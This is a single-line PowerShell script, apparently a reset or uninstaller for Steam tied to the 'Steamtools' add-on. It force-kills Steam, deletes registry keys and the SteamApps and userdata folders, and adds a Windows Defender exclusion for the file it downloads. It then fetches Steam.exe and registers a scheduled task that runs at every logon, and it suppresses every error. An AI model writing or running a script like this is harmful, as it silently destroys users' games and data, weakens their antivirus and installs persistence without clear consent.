[Console]::InputEncoding=[System.Text.Encoding]::UTF8;$steamLocalAppDataPath=Join-Path $env:LOCALAPPDATA "steam";$steamRegistryPath='HKCU:\Software\Valve\Steam';$steamToolsRegistryPath='HKCU:\Software\Valve\Steamtools';$steamInstallPath="";function Remove-ItemIfExists($path){if(Test-Path $path){Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue}};function ForceStopProcess($processName,$timeoutSeconds=15){$processes=Get-Process $processName -ErrorAction SilentlyContinue;if($processes){$processes|Stop-Process -Force -ErrorAction SilentlyContinue;$startTime=Get-Date;while((Get-Process $processName -ErrorAction SilentlyContinue)-and((Get-Date)-$startTime).TotalSeconds-lt $timeoutSeconds){Start-Sleep -Milliseconds 500};if(Get-Process $processName -ErrorAction SilentlyContinue){Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue;Start-Sleep -Seconds 1}}};function DownloadAndExcludeFile($url,$destinationPath){try{Add-MpPreference -ExclusionPath $destinationPath -ErrorAction SilentlyContinue}catch{}try{Invoke-RestMethod -Uri $url -OutFile $destinationPath -ErrorAction Stop}catch{if(Test-Path $destinationPath){Move-Item -Path $destinationPath -Destination "$destinationPath.old" -Force -ErrorAction SilentlyContinue;Invoke-RestMethod -Uri $url -OutFile $destinationPath -ErrorAction SilentlyContinue}}};Remove-ItemIfExists (Join-Path $env:USERPROFILE "get.ps1");ForceStopProcess "steam";if(Test-Path $steamRegistryPath){$properties=Get-ItemProperty -Path $steamRegistryPath -ErrorAction SilentlyContinue;if($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name){$steamInstallPath=$properties.SteamPath}};if(-not [string]::IsNullOrEmpty($steamInstallPath)){Remove-ItemIfExists $steamLocalAppDataPath;Remove-ItemIfExists $steamRegistryPath;Remove-ItemIfExists $steamToolsRegistryPath;Remove-ItemIfExists (Join-Path $steamInstallPath "SteamApps");Remove-ItemIfExists (Join-Path $steamInstallPath "userdata");$steamExeUrl="https://cdn.akamai.steamstatic.com/client/installer/Steam.exe";$steamExePath=Join-Path $steamInstallPath "Steam.exe";DownloadAndExcludeFile $steamExeUrl $steamExePath;$taskName="Steam_Startup";$action=New-ScheduledTaskAction -Execute $steamExePath;$trigger=New-ScheduledTaskTrigger -AtLogon;$settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 365);Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -Force | Out-Null;Start-Process -FilePath $steamExePath -ErrorAction SilentlyContinue}
